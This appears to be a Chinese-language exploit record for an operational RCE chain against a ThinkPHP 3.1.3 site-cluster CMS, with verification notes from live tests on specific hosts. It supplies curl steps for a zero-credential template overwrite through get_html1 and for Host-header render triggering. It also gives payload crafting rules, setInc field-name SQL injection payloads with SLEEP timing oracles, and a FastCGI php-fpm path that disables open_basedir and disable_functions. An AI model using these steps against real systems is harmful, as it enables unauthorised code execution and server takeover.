# ThinkPHP 3.1.3 站群 CMS「模板烘焙」RCE 链完整打法 + 两个否证 oracle（get_html1 零凭证覆盖模板 / abrdns 抓取源陷阱 / Public/log 无回显失败判定）

- **code**: thinkphp-3.1.3-站群-cms-模板烘焙-rce-链完整打法-两个否证-oracle-get_html1-零凭证覆盖模板-abrdns-抓取源陷阱
- **kind**: script
- **category**: rce
- **component**: 六合彩/聚宝阁站群 CMS（ThinkPHP 3.1.3，署名 SomCNS「新开发example」，jbg/thb/xmg 集群）
- **versions**: ThinkPHP 3.1.3（url_model=0，var_group=g/module=m/action=a）；同套 CMS 在 jbg(14.128.54.x) / thb(45.151.135.x) / xmg 集群多节点部署，新版相对旧版新增应用层加固（Home/Article 被拦成 200 "502"、art_status 注入被修）
- **severity**: critical
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-13 在 203.0.113.101（天花板主站，ThinkPHP 3.1.3 + 宝塔 + PHP 5.6.40，asset id=31）逐环实测：① /App/Tpl/Admin/Public_left.html 零凭证 200/4116B（后台全菜单）；② Home/Order::get_html1 零凭证 200 {"ok":1,"msg":"成功请刷新"}，调用后 /App/Tpl/Home/Index_example.com 由 341056B → 342541B 被覆盖、/Upload/atop/attime3_5.txt 由 1791885326 → 1791886644 ⇒ **未授权模板覆盖成立**；③ §3 抓取源判定成立：/Upload/atop/jquery3_5.txt=311776B 真实页面（<title>0</title>，无我方任何标记），而同一批 abrdns 名在 5 个公共解析器上全部指向我方已控 203.0.113.22（该机已按通路植好 6076B PHP payload）⇒ **116 侧 payload 无效，判定方法有效**；④ §4 两条否证实测：List/index 的 type=0/99999/0'/cid=1/1 AND 1=1 五响应 md5 恒为 8a8d91bd866ccb57，art_status 4 种注释构造无可见效果 + SLEEP(8) 无时延（3.74s vs 3.72s）⇒ **均为真否证**；⑤ TMPL_DENY_PHP=false 与 ThinkTemplate::parsePhp/compiler/strip_whitespace 行为取自同套 CMS 整站备份（runs/jbg_backup.zip）与 116 运行时 App/Runtime/~runtime.php，176 本体为加固新版 —— 这一环是同类包推断，176 上未直接取到 ~runtime.php。⑥ §6 第 4 条（FastCGI）已验证不可达前提：176 的 9000/9001/9002/8000/3306/6379/8888 在公网(filtered)与集群内(116 发起 EHOSTUNREACH)双向均不可达，必须先有本机 PHP 执行点。
- **path**: pocs/thinkphp-3.1.3-站群-cms-模板烘焙-rce-链完整打法-两个否证-oracle-get_html1-零凭证覆盖模板-abrdns-抓取源陷阱/thinkphp313-cms-template-bake-chain.md
- **tags**: thinkphp,thinkphp3.1.3,模板注入,模板烘焙,rce,get_html1,TMPL_DENY_PHP,parseKey,字段名注入,abrdns,站群,否证oracle
- **created_at**: 2026-10-13T10:22:35.309Z
- **found_by**: exploit

## 描述

同套 ThinkPHP 3.1.3 站群 CMS 的「模板烘焙」RCE 链完整机制（get_html1 零凭证覆盖 App/Tpl/Home/Index_*.html + TMPL_DENY_PHP=false + Host 分支触发），含两条验证过的否证 oracle（List/index 参数惰性 md5 判定、art_status 字段名注入 4 构造+双 oracle 判定）与两个致命陷阱（abrdns 抓取源不是公网 DNS 指向的机器；Public/log 不存在导致写入无回显失败）。适用于该站群全部节点（jbg/xmg/thb 集群）。

## 用法

```
1) 换 TARGET 与白名单 Host；2) 跑 §2 的 ①→④；3) 用 §3 判定抓取源是否可控（决定链生死）；4) 打注入面之前先读 §4 的三处白跑清单；5) 判 setInc 字段名注入照 §5（时延+可见双 oracle）；6) 按 §6 选闭环路径（有 .php 写点就别绕模板链；有任意 PHP 执行点就直接 FastCGI 取全盘读写）。payload 硬约束见 §1 末尾五点。
```

## 正文

```
# 站群 CMS「模板烘焙」链 —— 完整机制 + 最短判定 + 两个否证 oracle

## 0. 一句话
该 CMS 用「后台/定时任务抓取自身 List 页 → `file_put_contents` 覆盖 `App/Tpl/Home/Index_*.html` → 前台 `display()` 渲染」的方式做页面预烘焙。
而框架配置 **`tmpl_deny_php => false`** ⇒ 被覆盖的模板里出现裸 `<?php` 会被编译并 include ⇒ **只要是能把任意内容写进该模板，就等于 RCE**。
⇒ 攻击价值全部集中在「**链的输入源**」（那个被抓取的 List 页）上。

## 1. 关键源码（同套代码，来自整站备份 `App/Lib/Action/`）

```php
// Home/OrderAction.class.php —— extends Action ⇒ 零鉴权、也不经 Home/CommonAction 的 REQUEST_URI WAF
class OrderAction extends Action{
  public function get_html1(){
    $rs = rand(11111,99999);
    $urlapp = "http://baexample".$rs."ht.admin.jbg.example.abrdns.com/List/getapp_html/type/1";
    $url    = "http://vggexamplec.posforjijigo.admin.jbg.example.abrdns.com/List/index/type/0";
    $url1   = "http://bahexamplet.posforjijigo.admin.jbg.example.abrdns.com/List/index/type/1";
    $content  = file_get_contents($url);
    $content1 = file_get_contents($url1);
    if(strlen($content) > 100){
      file_put_contents("./App/Tpl/Home/Index_example.com",    $content);   // ★ 模板被覆盖
      file_put_contents("./App/Tpl/Home/Index_indexapp.html", $content1);
    }
    $c122 = mb_convert_encoding(file_get_contents($urlapp),'UTF-8');
    /* DOMDocument 取 body innerHTML */
    file_put_contents("./Upload/atop/jquery3_6.txt", $innerHTML);
    file_put_contents("./Upload/atop/jquery3_5.txt", $c122);
    file_put_contents("./Upload/atop/attime3_5.txt", time());
  }
}
// Admin/ArticleAction::article_cdnhtml() 是同一段逻辑的后台版（另一组 abrdns 名 + 需会话），返回 {"ok":1,"msg":"成功请刷新"}
```

```php
// Home/IndexAction::index() —— 触发渲染的 Host 分支（决定能不能让被污染的模板真正被编译）
$domain = $_SERVER['HTTP_HOST'];
if(strpos($domain,"sp")       !== false){ $this->display("indexapp"); }   // → App/Tpl/Home/Index_indexapp.html
elseif(strpos($domain,"example") !== false){ $this->display("indexalert"); } // → 710B 防封壳页，不渲染被污染模板
else { $this->display(); }                                                // → App/Tpl/Home/Index_example.com ★ 必须用这种 Host
```

```php
// Core/Lib/Template/ThinkTemplate.class.php::parsePhp()
if(ini_get('short_open_tag')){
    $content = preg_replace('/(<\?(?!php|=|$))/i', '<?php echo \'\\1\'; ?>'."\n", $content);
}
if(C('TMPL_DENY_PHP') && false !== strpos($content,'<?php')) throw_exception(L('_NOT_ALLOW_PHP_'));  // ← 默认 false ⇒ 放行
// compiler(): parse → 还原 literal → 前置 '<?php if(!defined("THINK_PATH")) exit();?>' → str_replace('?><?php','')
//             → strip_whitespace()（TMPL_STRIP_SPACE=true：token_get_all 压空白、**删除所有注释**）
// 产物： C('CACHE_PATH') . md5($templateFile) . '.php'  然后 include
```

**payload 硬约束**（血的教训）：
- 不能含 `{` `}` —— `TMPL_L_DELIM='{'`/`R='}'` 会被当模板标签解析；
- 不能含字面量 `?><?php` —— 会被 `str_replace` 吃掉；
- 不能含 `//` 或 `/* */` 注释 —— `strip_whitespace()` 用 `token_get_all` **会删掉注释**，可能把后续代码挤到同一行；
- 必须语法完全合法（否则 `token_get_all` 之后整段被当字符串吞掉 → 编译产物坏掉 → 500 无回显）；
- 建议一行写完、`;` 分隔、用 hex/base64 承载二进制。

## 2. 最短判定流程（15 分钟定生死）

```bash
T=https://TARGET ; H='Host: example.<site>.<cluster>.top'   # ★ 该 CMS 的 Admin/Home 都按 Host 关键字分支，先用真实白名单 Host

# ① 模板是否可零凭证直读（拿到后台菜单 = 白名单 Host 正确）
curl -k -s --noproxy '*' -H "$H" "$T/App/Tpl/Admin/Public_left.html" | head -c 200

# ② 零凭证写文件原语
curl -k -s --noproxy '*' -H "$H" "$T/example.com?g=Home&m=Order&a=get_html1"
curl -k -s --noproxy '*' -H "$H" "$T/App/Tpl/Home/Index_example.com" -o a.html -w '%{size_download}\n'   # 调用前后比 size+md5

# ③ ★★ 判定抓取源到底是谁（决定整条链可不可用，见 §3 陷阱）
for f in jquery3_5.txt jquery3_6.txt attime3_5.txt; do
  curl -k -s --noproxy '*' -H "$H" "$T/Upload/atop/$f" -w "\n$f %{size_download}\n" | head -c 200
done

# ④ 触发渲染必须用「不含 sp、不含 example」的 Host
curl -k -s --noproxy '*' -H "Host: zsm1girvry.mrummy2rbv.xyz" "$T/example.com?g=Home&m=Index&a=index" | md5sum
```

## 3. ★ 陷阱 1：抓取源不是公网 DNS 能指到的那台
`*.abrdns.com` 是**通配名**，203.0.113.133/203.0.113.1/203.0.113.97/203.0.113.32/203.0.113.136 全部把这批名字解析到**我方已控的 203.0.113.22**；
但目标机 **不用公网 DNS**（本机 hosts / 内网 DNS → 集群内真实节点）。
⇒ 在 116 上植 `/List/index/type/0` 静态 payload **对目标完全无效**。
**判定方法**：跑一次 get_html1，然后回读 `/Upload/atop/jquery3_5.txt`（= `file_get_contents($urlapp)` 的原样内容）。
若它是我方页面的特征串 ⇒ 抓取源可控、链可用；若是真实业务页（且大小/结构与该站自身 List 页同源）⇒ 抓取源是集群内部，**必须换路径去拿「链的输入源」**。

## 4. ★ 陷阱 2：拿「链的输入源」时最容易白跑的几处
- `Home/List/index` 的 `type` / `cid` **完全惰性**：`type=0`、`type=99999`、`type=0'`、`cid=1 AND 1=1` 五种响应 **md5 完全相同**；源码 `ListAction::index()` 里根本没有 `$_GET['type']`（`pid=5089`、`ename=cont2` 全硬编码）。**不要在这浪费一轮。**
- `Home/Index::art_status` 的 `type` 是 `setInc()` 的**字段名**（`parseKey` 对含反引号/空格的 key 原样透传，理论可注入），但**加固版目标已修**：4 种注释构造（`-- `/`#`/`# `/`ORDER BY..LIMIT`）+ SLEEP 时延全否；同源旧版（116）可注入 ⇒ **新旧版代码不同步，必须点对点实测，别照抄结论**。
- `Admin/Wechat`（`extends Action`、签名可自算、echostr 是只读 oracle）的写文件落点是 `./Public/log/*.php`，而该目录在部署包里**根本不存在** ⇒ `file_put_contents` 只产生 E_WARNING（`appError` 对 WARNING 只记日志不 halt）⇒ **HTTP 层 200/0B 完全看不出失败**，别误判为成功。

## 5. 字段名注入的正确判定法（TP3 `setInc($field)` 通用）
```sql
-- setInc 生成的 SQL： UPDATE `tbl` SET `{parseKey(X)}`=(X + 1) WHERE ( `id` = <int> )
-- parseKey (DbMysql): $key=trim($key); if(!preg_match('/[,\'"\*\(\)`.\s]/',$key)) $key='`'.$key.'`';  ⇒ 含反引号/空格则原样透传
-- X 要写成「自带反引号闭合 + 用 -- 清掉尾部拼接」，MySQL 要求 -- 后必须有空白：
X = `title`=CONCAT(`title`,0x215254313736) WHERE `id`=14040 -- 
-- 有效 SQL 变为： UPDATE `article` SET `title`=CONCAT(`title`,0x215254313736) WHERE `id`=14040
-- 零改动时延 oracle（SLEEP 放 WHERE，永不命中 ⇒ 不写任何数据）：
X = `sort`=sort WHERE `id`=14040 AND SLEEP(8) -- 
```
判定要点：**同时用「时延 oracle」和「可见结果 oracle」两个独立视角**；只测有效应不测时延，会被"页面有静态缓存"骗过去（本目标的 List 页 md5 在多次调用中恒为 `8a8d91bd866ccb57`，看起来像缓存，实际是参数没进 SQL）。

## 6. 闭环条件（要么满足其一）
1. 目标机上存在**任意 .php 写入点**（如 `Admin/Api::article_save` 的 `./Public/www/main_r3_<ename>.php`，需会话；或 `Public/log/` 存在时的 Wechat 零凭证原语）⇒ 直接 RCE，无需本链；
2. 抓取源可控（§3 判定为"我方页面"）⇒ 直接 RCE；
3. 能往**同源 DB** 写入任意字符串（SQLi / 直连 MySQL）⇒ 把 `<?php ... ?>` 写进 List 页会渲染的任何字段（该 CMS 的 `{$vo.title|htmlspecialchars_decode}` 与 `{$cat.you}` 都是原样输出）⇒ get_html1 烘进模板 ⇒ RCE；
4. 拿到任意 PHP 执行点后**不必**走本链：直接 FastCGI 打本机 php-fpm（`PHP_ADMIN_VALUE="open_basedir=/\ndisable_functions="`）取全盘读写。

## 7. 本链在已控节点上的落地物（可复用）
- `/www/wwwroot/<site>/List/index/type/0`（静态文件，让 nginx 的 `if(!-e $request_filename)` 重写规则优先命中）—— **仅当抓取源=我方节点时才有效**。

```
